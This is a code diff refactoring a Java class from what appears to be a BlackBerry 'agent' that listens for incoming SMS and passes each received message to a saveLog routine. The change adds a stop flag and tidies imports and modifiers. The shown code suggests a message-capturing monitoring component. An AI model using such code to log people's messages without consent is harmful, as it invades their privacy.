@@ -1,26 +1,17 @@
 package blackberry.agent.sms;
 
-import java.io.ByteArrayOutputStream;
 import java.io.IOException;
 
-import javax.wireless.messaging.BinaryMessage;
 import javax.wireless.messaging.MessageConnection;
 import javax.wireless.messaging.MessageListener;
-import javax.wireless.messaging.TextMessage;
 
-import net.rim.blackberry.api.mail.Message;
-import net.rim.device.api.util.DataBuffer;
-
-import blackberry.agent.MessageAgent;
-import blackberry.utils.Check;
-import blackberry.utils.DateTime;
 import blackberry.utils.Debug;
 import blackberry.utils.DebugLevel;
 
 /**
  * Dalla 4.7 implements SendListener
+ * 
  * @author user1
- *
  */
 class SMSINListener implements MessageListener, Runnable {
 
@@ -28,24 +19,37 @@ class SMSINListener implements MessageListener, Runnable {
     static Debug debug = new Debug("SMSINListener", DebugLevel.VERBOSE);
 
     private int messages;
-    private SmsListener smsListener;
-    private MessageConnection conn;
+    private final SmsListener smsListener;
+    private final MessageConnection conn;
+    
+    boolean requestStop;
 
-    public SMSINListener(MessageConnection conn, SmsListener smsListener) {
+    public SMSINListener(final MessageConnection conn,
+            final SmsListener smsListener) {
         messages = 0;
         this.conn = conn;
         this.smsListener = smsListener;
     }
 
+    public synchronized void notifyIncomingMessage(final MessageConnection conn) {
+        messages++;
+        notifyAll();
+    }
+    
+    public void stop(){
+        requestStop = true;
+    }
+
     public void run() {
-        while (true) {
+        requestStop = false;
+        while (!requestStop) {
             while (messages > 0) {
                 try {
-                    javax.wireless.messaging.Message m = conn.receive();
-                    
+                    final javax.wireless.messaging.Message m = conn.receive();
+
                     smsListener.saveLog(m, true);
-                                      
-                } catch (IOException e) {
+
+                } catch (final IOException e) {
                     e.printStackTrace();
                 }
                 messages--;
@@ -53,17 +57,11 @@ class SMSINListener implements MessageListener, Runnable {
             synchronized (this) {
                 try {
                     wait();
-                } catch (Exception e) {
+                } catch (final Exception e) {
                     e.printStackTrace();
                 }
             }
         }
     }
-
-    public synchronized void notifyIncomingMessage(MessageConnection conn) {
-        messages++;
-        notifyAll();
-    }
-    
 
 }
